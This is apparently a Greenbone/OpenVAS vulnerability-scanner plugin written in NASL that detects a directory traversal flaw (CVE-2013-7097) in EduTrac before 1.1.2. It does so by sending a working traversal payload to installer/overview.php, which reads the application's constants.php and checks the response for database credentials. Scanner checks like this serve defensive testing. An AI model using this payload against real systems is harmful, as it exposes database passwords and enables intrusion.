# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804198");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2013-7097");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2014-01-22 16:29:04 +0530 (Wed, 22 Jan 2014)");
  script_name("7Media Web Solutions EduTrac < 1.1.2 Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"7Media Web Solutions EduTrac is prone to a directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"A flaw exists due to insufficient filtration of 'showmask' HTTP
  GET parameter passed to 'overview.php' script.");

  script_tag(name:"impact", value:"Successful exploitation may allow an attacker to obtain sensitive
  information, which can lead to launching further attacks.");

  script_tag(name:"affected", value:"7Media Web Solutions eduTrac before version 1.1.2.");

  script_tag(name:"solution", value:"Update to version 1.1.2 or later.");

  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23190");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64255");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124653/eduTrac-1.1.1-Stable-Path-Traversal.html");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

foreach dir(make_list_unique("/", "/eduTrac", "/trac", http_cgi_dirs(port:port))) {

  if(dir == "/")
    dir = "";

  res = http_get_cache(item:dir + "/index.php", port:port);

  if(res && res =~ "Powered by.*eduTrac") {
    url = dir + "/installer/overview.php?step=writeconfig&showmask=../../eduTrac/Config/constants.php";
    if(http_vuln_check(port:port, url:url, pattern:"DB_PASS', '", extra_check:make_list("DB_USER', '","DB_NAME', '"))) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
     }
  }
}

exit(99);
